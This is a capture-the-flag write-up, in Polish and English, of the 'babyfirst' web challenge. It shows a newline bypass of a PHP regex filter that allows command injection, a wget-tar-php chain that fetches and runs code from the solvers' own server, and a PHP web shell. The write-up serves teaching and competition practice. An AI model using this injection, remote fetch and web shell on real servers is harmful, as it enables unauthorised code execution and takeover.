﻿## babyfirst (web, 100p, ?? solves)

> baby, do it first.

> http://52.68.245.164

### pl
[eng](#eng-version)

po połączeniu się pod podany url wyświetla się nam taka strona:

```php
<?php
    highlight_file(__file__);

    $dir = 'sandbox/' . $_server['remote_addr'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_get['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
```

program tworzy folder "sandbox/nasze_ip" oraz `chdir`uje do niego. możemy wyświetlić zawartość tego folderu nawigując w przeglądarce
do http://52.68.245.164/sandbox/nasze_ip. straciliśmy w tym momencie dużo czasu na zgadywanie co robi /bin/orange (cóż, okazuje się że nic - był to link symboliczny do /bin/true).

ale później zaczeliśmy myśleć, w jaki sposób można ominąć preg_match() - bo to jedyny sposób jaki widzieliśmy. próbowaliśmy różnych rzeczy,
ale ostatecznie zauważyliśmy bardzo ciekawą rzecz - jeśli ostatnim bajtem wyrazu jest \n, przechodzi on ten check. co to oznacza? że możemy 
zmusić exec do wykonania czegoś takiego:

http://52.68.245.164/?args[]=a%0a&args[]=touch&args[]=cat

```
/bin/orange a
touch cat
```

i stworzy nam to plik `cat` w naszym sandboxowym folderze. jest to bardzo duży krok w przód - możemy wykonać dowolne polecenie składające się ze znaków alfanumerycznych.
następnie myśleliśmy długo, jaką komendę wykonać - wszystko ciekawe wymagało użycia albo albo slasha, albo myślnika, albo kropki.

odkryliśmy na szczęście w pewnym momencie, że wget ciągle wspiera pobieranie stron po ip, podanym jako liczbie! to znaczy że zadziała coś takiego:

http://92775836/

w tym momencie byliśmy kolejny duży krok bliżej rozwiązania zadania - wget może np. pobrać kod php z naszego serwera (jako tekst), a my wykonamy go za pomocą lokalnego intepretera php.
niestety, duży problem. wget zapisuje pliki do pliku o nazwie "index.html", a my nie jesteśmy w stanie takiej nazwy przekazać php (kropka!). redirecty
po stronie serwera nie zmienią też nazwy pliku, bo do tego trzeba przekazać wgetowi odpowiednią opcję (myślnik!).

zaczęliśmy się więc zastanawiać nad poleceniami, które dla podania swoich argumentów nie wymagają myślników. od razu na myśl przyszedł nam `tar`. gdyby udało nam się przekazać stworzone archiwum do interpretera php, ten powinien zignorować wszystko poza kodem php zawartym w `<?php ?>`.

ciąg naszych ostatecznych poleceń wygląda następująco:

```
mkdir exploit
cd exploit
wget 92775836
tar cvf archived exploit
php archived
```

nasz "eksploit" działał w następujący sposób:

```php
<?php
file_put_contents('shell.php', '
    <?php
    header("content-type: text/plain");
    print shell_exec($_get["cmd"]);
    ?>
');
?>
```

dzięki temu mogliśmy wykonywać już polecenia bez żadnych ograniczeń i w ten sposób szybko znaleźliśmy program odczytujący flagę w `/`.

### eng version

after connecting to the provided url we get the following page:

```php
<?php
    highlight_file(__file__);

    $dir = 'sandbox/' . $_server['remote_addr'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_get['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
```

the program creates a directory: "sandbox/our_ip" and `chdir`s to it. we can list contents of the folder in a browser by navigating to http://52.68.245.164/sandbox/our_ip. we lost a lot of time at this moment by guessing what /bin/orange does (well, it turns out it does nothing, it's just a symbolic link to /bin/true). 

but then we started to think about how to bypass the preg_match() check - seeing as it was the only possible way. we tried a lot of things but finally noticed an interesting feat - if the last byte of the string is a newline character (`\n`) it also passes the check. what does it mean? that we can force exec to execute something like this:

http://52.68.245.164/?args[]=a%0a&args[]=touch&args[]=cat

```
/bin/orange a
touch cat
```

and that will create us a file named `cat` in our sandboxed folder. it's a big step forward - we can now execute an arbitrary command composing of alphanumeric characters. then we thought long about which command to actually execute - everything interesting needed using slash, dash or dot.

but lucky us, we finally discoverd that `wget` is still supporting resolving ip hosts by its `long` number format. that means that we can make a download from:

http://92775836/

and that took us even further to completing the task: wget can download a php code from our webserver as text and then we'll execute it passing it to the local php interpreter.
however, there's a big problem: wget saves contents to a file named `index.html`, but we can't pass that filename to php (the dot!). server-side redirects won't change the filename as well, because wget needs a parameter for that (dash!).

we begun by thinking of all commands which for their arguments don't need dashes. we almost instantly thought of `tar`. if we could pass a non-compressed archive to the php interpreter it should ignore everything besides php code enclosed in `<?php ?>`. 

our final command chain looks like this:

```
mkdir exploit
cd exploit
wget 92775836
tar cvf archived exploit
php archived
```

our "exploit" worked in a following way:

```php
<?php
file_put_contents('shell.php', '
    <?php
    header("content-type: text/plain");
    print shell_exec($_get["cmd"]);
    ?>
');
?>
```

thanks to which we could execute commands with no limitations of the character set and that way we quickly found a program giving us a flag sitting in `/`.

